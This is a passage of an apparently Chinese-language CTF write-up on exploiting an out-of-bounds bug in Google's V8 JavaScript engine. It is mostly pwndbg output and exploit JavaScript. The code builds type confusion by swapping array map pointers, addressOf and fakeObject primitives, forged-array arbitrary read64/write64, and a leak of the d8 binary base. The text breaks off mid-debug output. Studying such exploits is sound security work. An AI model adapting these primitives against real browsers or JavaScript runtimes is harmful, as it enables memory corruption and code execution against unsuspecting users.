0x200000000&lt;--- elements</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000&lt;--- elements</span><br><span class="line">05:0028│   0x25641fd4dd90 —▸ 0x3e40e9040851 ◂— 0x3e40e90401&lt;--- map</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return addr:3.38180564031224e-310</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90     &lt;--- map pointer</span><br><span class="line">$17 &#x3D; 3.3818056403122411e-310</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000</span><br><span class="line">05:0028│   0x25641fd4dd90 ◂— 0x4000000000000000   &lt;--- 被覆盖</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90</span><br><span class="line">$18 &#x3D; 2</span><br></pre></td></tr></table></figure><p>可以发现v8的内存对象大致如下：其中<code>map pointer</code>描述数组对象的结构，<code>element pointer</code>是存储数组元素的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-32 : some pointer &#x2F;&#x2F; not related to the challenge. This is memory is also where the element pointer points at.</span><br><span class="line">-24 : length of segment</span><br><span class="line">-16 : element 0 </span><br><span class="line">-8  : element 1</span><br><span class="line">+0  : map pointer &#x2F;&#x2F; the address where the obj pointer points at</span><br><span class="line">+8  : property pointer</span><br><span class="line">+16 : element pointer &#x2F;&#x2F;pointing at location -32</span><br><span class="line">+24 : length( in the high four bytes )</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">DebugPrint: 0x3db1856cddd9: [JSArray]</span><br><span class="line"> - map: 0x0306e9582f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c8177d11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1bb28b3c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x26c38c5c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3db1856cdd81 &lt;Object map &#x3D; 0x306e9580459&gt;</span><br><span class="line">           1: 0x3db1856cde19 &lt;HeapNumber 2.2&gt;</span><br></pre></td></tr></table></figure><p>通过上述例子，我们可以看到我们所泄露出来的地址就是<code>map pointer</code>，而<code>map pointer</code>数组的指示其元素的类型，如果我们利用<code>oob</code>的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象 B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><p>如果我们定义一个 <code>FloatArray</code> 浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问 B[0] 返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问 B[0] 时，返回的就不是对象元素 B[0] ，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问 A[0] 时，返回的就不是浮点数 A[0]，而是以 A[0] 为内存地址的一个JavaScript对象了。</p><p>其实到现在可以简化一下漏洞：</p><ul><li>泄露 <code>map pointer</code></li><li>覆写 <code>map pointer</code></li></ul><h4 id="addressOf-amp-amp-fakeObject"><a href="#addressOf-amp-amp-fakeObject" class="headerlink" title="addressOf &amp;&amp; fakeObject"></a>addressOf &amp;&amp; fakeObject</h4><blockquote><p>我们得到的数据都是浮点数的形式，而我们需要的是其在内存中的16进制数据，所以需要浮点数和整数之间的转换</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// leak the addrsess of obj</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    objArray.oob(floatArrayMap); <span class="comment">// type(obj)--&gt;type(float)</span></span><br><span class="line">    <span class="keyword">let</span> addr = f2i(objArray[<span class="number">0</span>])<span class="number">-1n</span>;</span><br><span class="line">    objArray.oob(objArrayMap);</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeobj</span>(<span class="params">addr_to_fake</span>)</span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = i2f(addr_to_fake+<span class="number">1n</span>);</span><br><span class="line">    floatArray.oob(objArrayMap);  <span class="comment">// type(float)--&gt;type(obj)</span></span><br><span class="line">    <span class="keyword">let</span> fake_obj = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(floatArrayMap);</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//var test = &#123;&#125;;</span></span><br><span class="line"><span class="comment">//%DebugPrint(test);</span></span><br><span class="line"><span class="comment">//var testAddr = addressOf(test);</span></span><br><span class="line"><span class="comment">//console.log(&quot;[*] leak object addr: 0x&quot; + hex(testAddr));</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">v8/out.gn/x64.release$ ./d8 --allow-natives-syntax ./test.js</span></span><br><span class="line"><span class="comment">0x26ebb348f061 &lt;Object map = 0x2e6f2340459&gt;</span></span><br><span class="line"><span class="comment">[*] leak object addr: 0x000026ebb348f060</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h4><p>我们可以写一个 js 数组伪造成一个 js 对象(结构如下)，那么当我们访问<code>fake_array[2]</code>的时候就会当成一个对象去访问，那么我们就可以修改他的值，从而实现任意地址写</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map, </span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    i2f(<span class="number">0x4141414141414141</span>),  <span class="comment">//&lt;-- elements指针</span></span><br><span class="line">    i2f(<span class="number">0x400000000</span>)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1111</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%DebugPrint(a[<span class="number">0</span>]);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0de19: [JSArray]</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b1442f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dd1111 &lt;JSArray[0]&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - length: 2</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #length: 0x296b7b3c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> - elements: 0x3f28a7f0de39 &lt;FixedArray[2]&gt; &#123;</span></span><br><span class="line"><span class="comment">           0: 0x3f28a7f0dda9 &lt;Object map = 0x17f6b144ab39&gt;   &lt;--- elements point</span></span><br><span class="line"><span class="comment">           1: 0x3f28a7f0de59 &lt;HeapNumber 2.2&gt;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">DebugPrint: 0x3f28a7f0dda9: [JS_OBJECT_TYPE]                  &lt;--- elements point</span></span><br><span class="line"><span class="comment"> - map: 0x17f6b144ab39 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span></span><br><span class="line"><span class="comment"> - prototype: 0x32ef84dc2091 &lt;Object map = 0x17f6b1440229&gt;</span></span><br><span class="line"><span class="comment"> - elements: 0x394d91600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment"> - properties: 0x394d91600c71 &lt;FixedArray[0]&gt; &#123;</span></span><br><span class="line"><span class="comment">    #a: 1111 (const data field 0)</span></span><br><span class="line"><span class="comment"> &#125;*/</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj&#x27;s elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">var a = [1.1, 2.2, 3.3];</span></span><br><span class="line"><span class="comment">%DebugPrint(a);</span></span><br><span class="line"><span class="comment">var a_addr = addressOf(a);</span></span><br><span class="line"><span class="comment">console.log(&quot;[*] addressOf a: 0x&quot; + hex(a_addr));</span></span><br><span class="line"><span class="comment">read64(a_addr);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="comment">write64(a_addr, 0x01020304n);</span></span><br><span class="line"><span class="comment">%SystemBreak();</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h4 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h4><p>方法A：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x000038ebfeb8f9a0-0x8000 0x5000</span><br><span class="line">...</span><br><span class="line">4ab:2558│   0x38ebfeb89ef8 —▸ 0x1b4669081f49 ◂— 0x300001b46690801</span><br><span class="line">4ac:2560│   0x38ebfeb89f00 ◂— 0x7b837e1e6</span><br><span class="line">4ad:2568│   0x38ebfeb89f08 —▸ 0xcd44db0a001 ◂— 0xe600001b46690804</span><br><span class="line">4ae:2570│   0x38ebfeb89f10 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4af:2578│   0x38ebfeb89f18 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">4b0:2580│   0x38ebfeb89f20 —▸ 0x1b4669080b71 ◂— 0x200001b46690801</span><br><span class="line">4b1:2588│   0x38ebfeb89f28 —▸ 0x55dc49c98e40 ◂— push   rbp</span><br><span class="line">pwndbg&gt; x&#x2F;gx 0x55dc49c98e40</span><br><span class="line">0x55dc49c98e40 &lt;_ZN2v812_GLOBAL__N_118WebAssemblyCompileERKNS_20FunctionCallbackInfoINS_5ValueEEE&gt;:0x56415741e5894855</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a &#x3D; [1.1, 2.2, 3.3];</span><br><span class="line">var start_addr &#x3D; addressOf(a);</span><br><span class="line">var leak_d8_addr &#x3D; 0n;</span><br><span class="line">start_addr &#x3D; start_addr-0x8000n;</span><br><span class="line">while(1)&#123;</span><br><span class="line">    start_addr &#x3D; start_addr-8n;</span><br><span class="line">    leak_d8_addr &#x3D; read64(start_addr);</span><br><span class="line">    if(((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000560000000e40n)||((leak_d8_addr&amp;0x0000ff0000000fffn)&#x3D;&#x3D;0x0000550000000e40n))&#123;</span><br><span class="line">        console.log(&quot;leak process addr success: &quot;+hex(leak_d8_addr));</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跑了半天，没泄露出来…</p><p>方法B：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*------------------------------leak d8------------------------------*&#x2F;</span><br><span class="line">var code &#x3D; read64(addressOf(floatArray.constructor)-0x1n+0x30n); &#x2F;&#x2F;get constructor.code ptr</span><br><span class="line">var d8Leak &#x3D; read64(code-0x1n+0x40n) &gt;&gt; 16n; &#x2F;&#x2F;read addr from &quot;mov r10, addr&quot;</span><br><span class="line">var d8Base &#x3D; d8Leak - 0xad54e0n;</span><br><span class="line">console.log(&quot;[*] d8 base : &quot; + hex(d8Base));</span><br></pre></td></tr></table></figure><blockquote><p>查看Array对象结构 –&gt; 查看对象的Map属性 –&gt; 查看Map中指定的constructor结构 –&gt; 查看code属性 –&gt;在code内存地址的固定偏移处存储了v8二进制的指令地址</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test_array = [<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(test_array);</span><br><span class="line">%DebugPrint(test_array.constructor);</span><br><span class="line">%SystemBreak();</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">pwndbg&gt; pwd</span><br><span class="line">xxx/v8/out.gn/x64.debug</span><br><span class="line">...</span><br><span class="line">DebugPrint: <span class="number">0x24741f34ddb9</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2ed9</span> &lt;<span class="built_in">Map</span>(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5311111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">1</span></span><br><span class="line"> - properties: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x24741f34dda1</span> &lt;FixedDoubleArray[<span class="number">1</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.1</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">DebugPrint: <span class="number">0x39ddc5310ec1</span>: [<span class="built_in">Function</span>] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: <span class="number">0x3fb2ce6c2d49</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x39ddc5302109</span> &lt;JSFunction (sfi = <span class="number">0x18405dc08039</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x2df35e640c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: 0x39ddc5311111 &lt;JSArray[0]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x3fb2ce6c2d99</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x18405dc0aca1</span> &lt;SharedFunctionInfo <span class="built_in">Array</span>&gt;</span><br><span class="line"> - name: 0x2df35e643599 &lt;String[#5]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x39ddc5301869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x11c169a06c01</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x39ddc5311029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    #length: 0x18405dc004b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #name: 0x18405dc00449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    #prototype: 0x18405dc00529 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line">    <span class="number">0x2df35e644c79</span> &lt;<span class="built_in">Symbol</span>: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x2df35e644f41</span> &lt;<span class="built_in">Symbol</span>: <span class="built_in">Symbol</span>.species&gt;: <span class="number">0x39ddc5310fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: 0x39ddc5311069 &lt;JSFunction isArray (sfi = 0x18405dc0ad39)&gt; (const data field 1) properties[1]</span><br><span class="line">    #from: 0x39ddc53110a1 &lt;JSFunction from (sfi = 0x18405dc0ad89)&gt; (const data field 2) properties[2]</span><br><span class="line">    #of: 0x39ddc53110d9 &lt;JSFunction of (sfi = 0x18405dc0adc1)&gt; (const data field 3) properties[3]</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">pwndbg&gt; job <span class="number">0x3fb2ce6c2ed9</span></span><br><span class="line"><span class="number">0x3fb2ce6c2ed9</span>: [<span class="built_in">Map</span>]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">32</span></span><br><span class="line"> - inobject properties: <span class="number">0</span></span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">0</span></span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: <span class="number">0x3fb2ce6c2e89</span> &lt;<span class="built_in">Map</span>(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x18405dc00609</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance descriptors #1: 0x39ddc5311f49 &lt;DescriptorArray[1]&gt;</span><br><span class="line"> - layout descriptor: (nil)</span><br><span class="line"> - transitions #1: 0x39ddc5311eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span><br><span class="line">     <span class="number">0x2df35e644ba1</span> &lt;<span class="built_in">Symbol</span>: (elements_transition_symbol)&gt;: (transition to 